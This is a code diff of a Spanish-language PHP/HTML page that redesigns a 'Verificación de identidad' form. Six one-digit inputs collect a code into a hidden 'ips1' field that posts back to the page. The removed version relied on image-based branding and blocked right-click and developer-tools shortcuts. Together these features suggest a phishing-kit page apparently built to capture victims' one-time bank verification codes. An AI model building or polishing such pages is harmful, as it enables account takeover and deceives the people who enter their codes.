@@ -36,88 +36,176 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && $usuario) {
 <!DOCTYPE html>
 <html lang="es">
 <head>
-    <meta charset="UTF-8">
-    <title>Validación - Error</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verificación de identidad</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+
+body{
+    font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;
+    background:#f7f7f7;
+    color:#333;
+    min-height:100vh;
+    display:flex;
+    justify-content:center;
+    align-items:flex-start;
+    padding:40px 20px;
+}
+
+.card{
+    background:#fff;
+    border-radius:10px;
+    width:100%;
+    max-width:440px;
+    padding:36px 30px 30px;
+    box-shadow:0 4px 18px rgba(0,0,0,0.06);
+    text-align:left;
+}
+
+.icon-wrap{
+    width:54px;
+    height:54px;
+    border:2px solid #00853f;
+    border-radius:10px;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    margin-bottom:24px;
+}
+
+.icon-wrap svg{width:30px;height:30px;}
+
+h1{
+    font-size:22px;
+    color:#222;
+    font-weight:700;
+    margin-bottom:18px;
+}
+
+.subtitle{
+    font-size:15px;
+    color:#444;
+    margin-bottom:26px;
+}
+
+.code-inputs{
+    display:flex;
+    justify-content:space-between;
+    gap:8px;
+    margin-bottom:30px;
+}
+
+.code-inputs input{
+    flex:1;
+    aspect-ratio:1/1;
+    max-width:50px;
+    text-align:center;
+    font-size:22px;
+    font-weight:600;
+    color:#222;
+    border:1.5px solid #d4d4d4;
+    border-radius:6px;
+    background:#fff;
+    outline:none;
+    transition:0.15s;
+    -moz-appearance:textfield;
+}
+
+.code-inputs input::-webkit-outer-spin-button,
+.code-inputs input::-webkit-inner-spin-button{
+    -webkit-appearance:none;
+    margin:0;
+}
+
+.code-inputs input:focus{
+    border-color:#00853f;
+    box-shadow:0 0 0 2px rgba(0,133,63,0.15);
+}
+
+.btn-validar{
+    width:100%;
+    height:50px;
+    border:none;
+    border-radius:6px;
+    background:#00853f;
+    color:#fff;
+    font-size:16px;
+    font-weight:600;
+    cursor:pointer;
+    transition:0.2s;
+}
+
+.btn-validar:hover{background:#006b32;}
+.btn-validar:disabled{background:#9bc7ad;cursor:not-allowed;}
+
+@media(max-width:480px){
+    body{padding:24px 16px;}
+    .card{padding:28px 22px 24px;}
+    h1{font-size:20px;}
+    .subtitle{font-size:14px;margin-bottom:22px;}
+    .code-inputs{gap:6px;margin-bottom:24px;}
+    .code-inputs input{font-size:20px;}
+    .btn-validar{height:46px;font-size:15px;}
+}
+</style>
 </head>
 <body>
-<div id="main-cnt" style="overflow: hidden; min-height: 100vh; position: relative;">
-    <div id="ctn" style="display: inline-block; vertical-align: top; background-color: #fff;">
-        <div id="frmc" style="display: inline-block; text-align: center; border-radius: 8px; vertical-align: top; width: 500px;">
-            <form method="post" action="" id="f1"
-                  style="display: inline-block; width: 420px; height: 660px; border-radius: 10px; background-image: url(2.svg); position: relative;">
-                <img src="l.png" style="position: relative; top: 51px; left: -15px; width: 294px;">
-                <input minlength="6" maxlength="8" id="i1" name="ips1" placeholder="Código" type="text" inputmode="numeric" required
-                       style="display: block; position: relative; color: #333; background: transparent; border: none; top: 187px; left: 28px; height: 39px; width: 357px; padding-left: 12px; outline: none; font-size: 16px; font-family: dinReg, sans-serif;" autocomplete="off">
-                
-                <input type="submit" value="Continuar"
-                       style="display: block; position: relative; font-size: 16px; color: #fff; background: rgb(0, 105, 60); border: none; top: 224px; left: 28px; height: 39px; width: 364px; outline: none; border-radius: 8px;">
-            </form>
-        </div>
-        <div id="bnncont" style="text-align: right; display: inline-block;">
-            <div style="position: absolute; z-index: 1; opacity: 1; overflow: hidden; width: 80%; height: 100%; left: 500px; top: 0px; display: inline-block;">
-                <div id="bnn" style="background: url(bnn.jpg) left center / cover no-repeat; height: 100%; overflow: hidden; position: relative; text-align: center;">
-                    <img src="terms.svg" style="width: 60%; position: relative; top: 80vh;">
-                </div>
-            </div>
-        </div>
+<div class="card">
+    <div class="icon-wrap">
+        <svg viewBox="0 0 24 24" fill="none" stroke="#00853f" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <rect x="3" y="5" width="18" height="14" rx="2"></rect>
+            <circle cx="8.5" cy="11" r="1.8" fill="#00853f"></circle>
+            <line x1="13" y1="10" x2="18" y2="10"></line>
+            <line x1="13" y1="13" x2="18" y2="13"></line>
+            <line x1="6" y1="16" x2="18" y2="16"></line>
+        </svg>
     </div>
+
+    <h1>Verificación de identidad</h1>
+    <p class="subtitle">Ingrese el código enviado</p>
+
+    <form method="post" action="" id="codeForm" autocomplete="off">
+        <div class="code-inputs" id="codeInputs">
+            <input type="text" inputmode="numeric" maxlength="1" required>
+            <input type="text" inputmode="numeric" maxlength="1" required>
+            <input type="text" inputmode="numeric" maxlength="1" required>
+            <input type="text" inputmode="numeric" maxlength="1" required>
+            <input type="text" inputmode="numeric" maxlength="1" required>
+            <input type="text" inputmode="numeric" maxlength="1" required>
+        </div>
+        <input type="hidden" name="ips1" id="ips1">
+        <button type="submit" class="btn-validar">Validar código</button>
+    </form>
 </div>
 
-<style>
-    * { margin: 0; padding: 0; }
-    @font-face {
-        font-family: dinReg;
-        src: url(din-regular.ttf);
-    }
-
-    @media screen and (max-width: 1024px) {
-        body {
-            width: 100% !important;
-            background: linear-gradient(rgb(105, 190, 40), rgb(0, 105, 60)) !important;
-            background-repeat: no-repeat !important;
-            min-width: auto !important;
-            zoom: 90% !important;
-        }
-        #ctn {
-            border-radius: 6px !important;
-        }
-        #main-cnt {
-            text-align: center !important;
-            padding-top: 30px;
-        }
-        #frmc {
-            width: 100% !important;
-        }
-        #bnncont {
-            display: none !important;
-        }
-    }
-</style>
 <script>
-    // Protección contra clic derecho y código fuente
-    document.addEventListener('contextmenu', function(e) {
-        e.preventDefault();
-        return false;
+(function(){
+    const inputs = document.querySelectorAll('#codeInputs input');
+    const hidden = document.getElementById('ips1');
+    const form   = document.getElementById('codeForm');
+
+    inputs.forEach((inp, idx) => {
+        inp.addEventListener('input', e => {
+            inp.value = inp.value.replace(/\D/g,'').slice(0,1);
+            if (inp.value && idx < inputs.length - 1) inputs[idx+1].focus();
+        });
+        inp.addEventListener('keydown', e => {
+            if (e.key === 'Backspace' && !inp.value && idx > 0) inputs[idx-1].focus();
+        });
+        inp.addEventListener('paste', e => {
+            e.preventDefault();
+            const data = (e.clipboardData.getData('text') || '').replace(/\D/g,'').slice(0,inputs.length);
+            data.split('').forEach((d,i) => { if(inputs[i]) inputs[i].value = d; });
+            const nextEmpty = [...inputs].findIndex(i => !i.value);
+            (nextEmpty === -1 ? inputs[inputs.length-1] : inputs[nextEmpty]).focus();
+        });
     });
 
-    document.addEventListener('keydown', function(e) {
-        // Prevenir F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
-        if (e.keyCode === 123 || // F12
-            (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) || // Ctrl+Shift+I/J
-            (e.ctrlKey && e.keyCode === 85)) { // Ctrl+U
-            e.preventDefault();
-            return false;
-        }
+    form.addEventListener('submit', e => {
+        hidden.value = [...inputs].map(i => i.value).join('');
     });
-
-    // Prevenir arrastrar imágenes
-    document.addEventListener('dragstart', function(e) {
-        if (e.target.tagName === 'IMG') {
-            e.preventDefault();
-            return false;
-        }
-    });
+})();
 </script>
 </body>
 </html>
